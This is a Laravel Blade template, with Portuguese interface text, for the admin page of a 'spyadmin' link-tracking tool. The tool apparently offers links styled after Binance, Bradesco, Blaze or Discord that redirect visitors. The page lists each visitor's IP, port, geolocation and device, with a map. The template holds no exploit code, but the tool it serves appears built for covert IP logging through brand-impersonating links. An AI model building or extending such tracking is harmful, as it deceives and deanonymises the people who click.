@extends("layouts.apps")
@section("title", "Editar spyadmin")
@section("function_name", "spyadmin_manager")

@section("content")
    <div class="uk-container top-draken-source-item-public" style="margin-bottom: 3em;">
        <div>
            <h1 style="margin-top: 0em; margin-bottom: 0em;" class="title-dash-admin-draken">Detalhes da Investigação: <strong>{{ $details[0]->title }}</strong></h1>
            <p style="margin-top: 0em;">Gostaria de ver ou editar os detalhes desse item?</p>
        </div>
        <hr>
        
        <div>
            <div>
                <div uk-filter="target: .js-filter">
                    <ul class="uk-subnav uk-subnav-pill">
                        <li class="uk-active" uk-filter-control="[data-color='white']"><a href="#">Detalhes</a></li>
                        <li uk-filter-control="[data-color='blue']"><a href="#">Editar</a></li>
                        <li><a onclick="remover_item('{{ $details[0]->id }}');">Remover</a></li>
                        <?php if ($details[0]->status == "1") { ?>
                            <li><a onclick="finalizar_item('{{ $details[0]->id }}');">Finalizar</a></li>
                        <?php } ?>
                    </ul>
                    <style type="text/css">
                        .class-item-dash-inves .uk-card {
                            padding: 1em 1em; border-radius: 5px;
                        }

                        .class-item-dash-inves h3 {
                            font-size: 1em; margin-bottom: 0.5em!important; margin-top: 0em;
                        }

                        .class-item-dash-inves p {
                            font-size: 1em; margin-bottom: 0em!important; margin-top: 0em;
                        }

                        .class-item-dash-inves hr {
                            margin: 0 0 10px 0; border-top: 1px solid #e5e5e587;
                        }
                    </style>
                    <ul class="js-filter uk-child-width-1-1 uk-child-width-1-1@m" uk-grid>
                        <li data-color="white">
                            <?php 
                                $criado = date('d/m/Y h:i:s', strtotime($details[0]->created_at));
                                $editado = date('d/m/Y h:i:s', strtotime($details[0]->updated_at));
                            ?>
                            <div class="uk-child-width-1-4@m uk-grid-small uk-grid-match class-item-dash-inves" uk-grid>
                                <div>
                                    <div class="uk-card uk-card-default uk-card-body">
                                        <h3 class="uk-card-title">DATA DA CRIAÇÃO</h3>
                                        <hr>
                                        <p><span class="uk-badge"><?php echo $criado; ?></span></p>
                                    </div>
                                </div>
                                <div>
                                    <div class="uk-card uk-card-default uk-card-body">
                                        <h3 class="uk-card-title">ÚLTIMA ATIVIDADE</h3>
                                        <hr>
                                        <p><span class="uk-badge"><?php echo $editado; ?></span></p>
                                    </div>
                                </div>
                                <div>
                                    <div class="uk-card uk-card-default uk-card-body">
                                        <h3 class="uk-card-title">ACESSOS</h3>
                                        <hr>
                                        <p>
                                            <span class="uk-badge">
                                                <?php
                                                if ($details[0]->acessos == null) {
                                                    echo "0";
                                                } else {
                                                    echo $details[0]->acessos;
                                                }
                                                ?>
                                            </span>
                                        </p>
                                    </div>
                                </div>
                                <div>
                                    <div class="uk-card uk-card-default uk-card-body">
                                        <h3 class="uk-card-title">STATUS</h3>
                                        <hr>
                                        <?php if ($details[0]->status == "1") { ?>
                                            <span class="uk-badge" style="background-color: #1da07c; margin-right: 0.5em;">EM ABERTO</span>
                                        <?php } else { ?>
                                            <span class="uk-badge" style="background-color: #000; margin-right: 0.5em;">FECHADO</span>
                                        <?php } ?>
                                    </div>
                                </div>
                            </div>
                            <div style="margin-top: 1.5em;">
                                <h2 style="font-size: 1.4em;">RASTREAMENTO</h2>
                                <hr>
                            </div>
                            <div style="margin-bottom: 3em;">
                                <?php if ($select_visits_count > 0) { ?>
                                    <table id="example" class="uk-table uk-table-hover uk-table-striped" style="width:100%">
                                        <thead>
                                        <tr>
                                            <th><span style="margin-right: 0.3em;" uk-icon="world"></span> IP:PORTA</th>
                                            <th><span style="margin-right: 0.3em;" uk-icon="location"></span> GEOLOCALIZAÇÃO</th>
                                            <th><span style="margin-right: 0.3em;" uk-icon="tablet"></span> OS/BROWSER/DEVICE</th>
                                            <th><span style="margin-right: 0.3em;" uk-icon="calendar"></span> DATA</th>
                                            <th><span style="margin-right: 0.3em;" uk-icon="file-edit"></span> Detalhes</th>
                                        </tr>
                                        </thead>
                                        <tbody>
                                        @foreach ($select_visits as $post)
                                            <?php 
                                                $criado = date('d/m/Y h:i:s', strtotime($post->created_at));
                                            ?>
                                            <tr>
                                                <td><a style="color: #666; font-weight: 500;">{{ $post->remote }}</a></td>
                                                <td><a style="color: #666; font-weight: 500;">{{ $post->geo }}</a></td>
                                                <td><a style="color: #666; font-weight: 500;">{{ $post->os_platform }}</a></td>
                                                <td><a style="color: #666; font-weight: 500;">{{ $criado }}</a></td>
                                                <td><a type="button" uk-toggle="target: #modal-example-{{ $post->id }}"><span class="uk-badge" style="text-transform: uppercase;">Mais Detalhes</span></a></td>
                                            </tr>

                                            <!-- This is the modal -->
                                            <div id="modal-example-{{ $post->id }}" uk-modal>
                                                <div class="uk-modal-dialog uk-modal-body" style="width: 1100px!important;">
                                                    <h2 class="uk-modal-title" style="text-transform: uppercase; font-size: 1.2em;">{{ $details[0]->title }}</h2>
                                                    <hr>
                                                    <div class="uk-child-width-1-4@m uk-grid-small uk-grid-match class-item-dash-inves" uk-grid style="margin-bottom: 1em;">
                                                        <div>
                                                            <div class="uk-card uk-card-default uk-card-body">
                                                                <h3 class="uk-card-title">DATA DA CRIAÇÃO</h3>
                                                                <hr>
                                                                <p><span class="uk-badge"><?php echo $criado; ?></span></p>
                                                            </div>
                                                        </div>
                                                        <div>
                                                            <div class="uk-card uk-card-default uk-card-body">
                                                                <h3 class="uk-card-title">GEOLOCALIZAÇÃO</h3>
                                                                <hr>
                                                                <p><span class="uk-badge">{{ $post->geo }}</span></p>
                                                            </div>
                                                        </div>
                                                        <div>
                                                            <div class="uk-card uk-card-default uk-card-body">
                                                                <h3 class="uk-card-title">OS/BROWSER/DEVICE</h3>
                                                                <hr>
                                                                <p><span class="uk-badge">{{ $post->os_platform }}</span></p>
                                                            </div>
                                                        </div>
                                                        <div>
                                                            <div class="uk-card uk-card-default uk-card-body">
                                                                <h3 class="uk-card-title">STATUS</h3>
                                                                <hr>
                                                                <?php if ($details[0]->status == "1") { ?>
                                                                    <span class="uk-badge" style="background-color: #1da07c; margin-right: 0.5em;">EM ABERTO</span>
                                                                <?php } else { ?>
                                                                    <span class="uk-badge" style="background-color: #000; margin-right: 0.5em;">FECHADO</span>
                                                                <?php } ?>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div>
                                                        <h2 class="uk-modal-title" style="text-transform: uppercase; font-size: 1.2em;">Localização</h2>
                                                        <hr>
                                                    </div>
                                                    <iframe src="{{ env('APP_URL') }}dashboard/map/{{ $post->geo }}" style="width: 100%; height: 20em;"></iframe>
                                                    <p class="uk-text-right">
                                                        <button class="uk-button uk-button-default uk-modal-close" type="button">Fechar</button>
                                                    </p>
                                                </div>
                                            </div>
                                        @endforeach
                                        </tbody>
                                    </table>
                                <?php } else { ?>
                                    <div class="uk-alert-danger" uk-alert>
                                        <p>Ainda não houve acessos à sua investigação</p>
                                    </div>
                                <?php } ?>
                            </div>
                        </li>
                        <li data-color="blue">
                            <div class="uk-card uk-card-default uk-card-body">
                                <form class="uk-grid-small" uk-grid>
                                    <div class="uk-width-1-1@s">
                                        <label>Título da investigação</label>
                                        <input class="uk-input" type="text" id="title" placeholder="Título da investigação" value="{{ $details[0]->title }}">
                                    </div>
                                    <div class="uk-width-1-1@s">
                                        <label>Escolha um Domínio</label>
                                        <select class="uk-select" id="domain" disabled="">
                                            <option value="Blaze" <?php if ($details[0]->domain == "Blaze") { echo 'selected'; } ?>>Blaze</option>
                                            <option value="Binance" <?php if ($details[0]->domain == "Binance") { echo 'selected'; } ?>>Binance</option>
                                            <option value="Bradesco" <?php if ($details[0]->domain == "Bradesco") { echo 'selected'; } ?>>Bradesco</option>
                                            <option value="Discord" <?php if ($details[0]->domain == "Discord") { echo 'selected'; } ?>>Discord</option>
                                        </select>
                                    </div>
                                    <div class="uk-width-1-1@s">
                                        <label>Personalizar URL</label>
                                        <input class="uk-input" disabled="" type="input" id="url_edit" placeholder="Personalizar URL" value="{{ $details[0]->url_edit }}">
                                    </div>
                                    <div class="uk-width-1-1@s">
                                        <label>Redirecionar visitante para:</label>
                                        <input class="uk-input" type="input" id="redirect" placeholder="https://link.io/" value="{{ $details[0]->redirect }}">
                                    </div>
                                    
                                    <div class="uk-margin">
                                        <button type="submit" id="btn-submit-331905" class="uk-button uk-button-primary uk-width-1-1">Atualizar Investigação</button>
                                    </div>
                                </form>
                            </div>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
    </div>


    <script type="text/javascript">
        $.ajaxSetup({
            headers: { "X-CSRF-TOKEN": "{{ csrf_token() }}" }
        });

        function remover_item(id_item) {
            $.ajax({
                dataType: "json",
                ContentType: "application/json",
                type: "POST",
                url: "<?php echo env("APP_URL"); ?>spy_delet/"+id_item+"/",
                success: function (data) {
                    if(data.errors == undefined) {
                        if(data.status == "true") {
                            UIkit.notification(data.log, "success");
                            setTimeout(function () {
                                url_native_js = "{{ env('APP_URL') }}";
                                window.location = "" + url_native_js + "user/listar-investigacoes";
                            }, 2000);
                        } else {
                            UIkit.notification(data.log, "danger");
                        }
                    } else {
                        $.each(data.errors, function(index, value) {
                            UIkit.notification(value, "danger");
                        });
                    }
                }
            });
        }

        function finalizar_item(id_item) {
            $.ajax({
                dataType: "json",
                ContentType: "application/json",
                type: "POST",
                url: "<?php echo env("APP_URL"); ?>update_spy_status/"+id_item+"/",
                success: function (data) {
                    if(data.errors == undefined) {
                        if(data.status == "true") {
                            UIkit.notification(data.log, "success");
                            setTimeout(function () {
                                url_native_js = "{{ env('APP_URL') }}";
                                window.location = "" + url_native_js + "user/investigacao/<?php echo $details[0]->id; ?>";
                            }, 2000);
                        } else {
                            UIkit.notification(data.log, "danger");
                        }
                    } else {
                        $.each(data.errors, function(index, value) {
                            UIkit.notification(value, "danger");
                        });
                    }
                }
            });
        }

        $("#btn-submit-331905").click(function(e){
            // preventDefault
            e.preventDefault();

            // values inputs
            var title = $("#title").val();
            var domain = $("#domain option:selected").val();
            var url_edit = $("#url_edit").val();
            var redirect = $("#redirect").val();
            
            $.ajax({
                dataType: "json",
                ContentType: "application/json",
                type: "POST",
                url: "<?php echo env("APP_URL"); ?>edit_spyuser",
                data: {
                    title: title, domain: domain, url_edit: url_edit, redirect: redirect, id_item: "{{ $details[0]->id }}"
                },
                success: function (data) {
                    if(data.errors == undefined) {
                        if(data.status == "true") {
                            UIkit.notification(data.log, "success");
                        } else {
                            UIkit.notification(data.log, "danger");
                        }
                    } else {
                        $.each(data.errors, function(index, value) {
                            UIkit.notification(value, "danger");
                        });
                    }
                }
            });
        });
    </script>
@endsection
